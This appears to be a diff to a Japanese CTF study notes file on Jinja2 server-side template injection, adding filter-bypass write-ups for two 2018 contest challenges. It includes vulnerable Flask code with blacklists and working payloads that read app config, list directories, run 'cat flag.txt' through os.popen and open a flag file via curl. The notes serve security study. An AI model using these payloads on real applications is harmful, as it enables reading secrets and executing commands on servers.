@@ -1273,6 +1273,11 @@ Internal Server Error
 ```
 - `{{''.class.mro()[1].subclasses()}}`   
 
+#### filter bypass
+https://medium.com/bugbountywriteup/x-mas-2019-ctf-write-up-mercenary-hat-factory-ssti-53e82d58829e   
+https://ctftime.org/writeup/10895   
+https://0day.work/jinja2-template-injection-filter-bypasses/   
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2   
 
 ## tplmap (SSTI practice)
 https://github.com/epinna/tplmap   
@@ -2629,7 +2634,7 @@ JWTを付与して、`/admin/{{7*7}}`とかをすると49が返るのでSSTI可�
 ```txt
 /admin/{{request.application.globals.builtins.import(‘os’).popen(‘cat flag.txt’).read()}}
 ```
-## sample
+## jinja2 / bypass "(" ")" "config" "self" (TokyowesternsCTF 2018 Shrine)
 https://ctftime.org/writeup/10895   
 - **entrypoint**    
 `flask.render_template_string`に入力が入っているが、`(`,`)`,`config`,`self`がフィルタリングされている。   
@@ -2658,14 +2663,65 @@ if __name__ == '__main__':
     app.run(debug=True)
 ```
 `{{config}}`のように`config`にアクセスしたいが、できないので、上位のグローバル変数の`current_app`とかから`__globals__['current_app'].config['FLAG']`のようにしてアクセスするらしい。   
+もし制約がなければ以下でFlag見れたらしい！   
+`{{config}}`,`{{config.FLAG}}`,`{{self.__dict__}}`,`{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG]}}`   
 - **Payload**    
+```txt
+GET /shrine/{{url_for.__globals__['current_app'].config['FLAG']}}
 
-## sample
+GET /shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+
+shrine/{{session.__class__.__base__.get.__globals__['warnings']['sys']['modules']['app'].__dict__['app'].__dict__}}
+
+shrine/{{request.__class__.__dict__['_load_form_data'].__globals__['current_app'].config}}
+```
+## jinja2 / bypass "[]" "config" "attr" "class" "join" (HackIT CTF 2018 Believer Case)
+https://graneed.hatenablog.com/entry/2018/09/10/180318   
 - **entrypoint**    
+`/test`を入力すると`test`が返り、`/testhoge`を入力すると`testhoge`が返るので入力した文字列がそのままレスポンスに反映されているのでSSTIを試す。   `/{{7*7}}`が49が返るのでSSTI可能！   
 - **概要**    
-- **Payload**    
+`{{g}}`を確認すると以下よりFlaskだとわかるらしい。   
+```txt
+root@kali:~# curl "http://185.168.131.123/\{\{g\}\}"
+&lt;flask.g of &#39;app&#39;&gt;
+```
+使える文字を探すと、`]`,`[`,`open`,`config`,`request`,`attr`,`class`が使えないらしい。   
+```python
+from flask import Flask, render_template, render_template_string
+app = Flask(__name__)
+def blacklist_replace(template):
+    blacklist = ["[","]","config","self","from_pyfile","|","join","mro","class","request","pop","attr","args","+"]
+    for b in blacklist:
+        if b in template:
+           template=template.replace(b,"")
+    return template
+@app.route("/")
+def index_template():
+    return "Hello! I have been contacted by those who try to save the network. I tried to protect myself. Can you test out if I am secure now? <a href='/test'>See this</a>"
+@app.route("/<path:template>")
+def blacklist_template(template):
+    if len(template) > 10000:
+        return "This is too long"
+    while blacklist_replace(template) != template:
+        template = blacklist_replace(template)
+    return render_template_string(template)
+if __name__ == '__main__':
+    app.run(debug=False)
+```
+tokyowesternsCTF2018のShrineのように`url_for.__globals__.__getitem__('os').listdir('./')`でフラグファイルを発見できるらしい！   
+`[]`が使えないため、`__getitem__`で代用できるらしい。   
 
-## sample
+- **Payload**    
+```txt
+root@kali:~# curl "http://185.168.131.123/\{\{url_for.__globals__.__getitem__('__builtins__').__getitem__('open')('flag_secret_file_910230912900891283').read()\}\}"
+flag{blacklists_are_insecure_even_if_you_do_not_know_the_bypass_friend_1023092813}
+```
+## jinja2 / bypass "config" "self" "request" "[]" "\"" "\_" "+" " " "join" "%" "%25"
+https://medium.com/bugbountywriteup/x-mas-2019-ctf-write-up-mercenary-hat-factory-ssti-53e82d58829e   
+まだ読めてない。   
+## その他
+https://graneed.hatenablog.com/entry/2019/12/29/115100#Server-Side-Template-InjectionSSTI   
+ここに載ってるSSTIのやつ。難しくてまだよくわからん…   
 - **entrypoint**    
 - **概要**    
 - **Payload**    
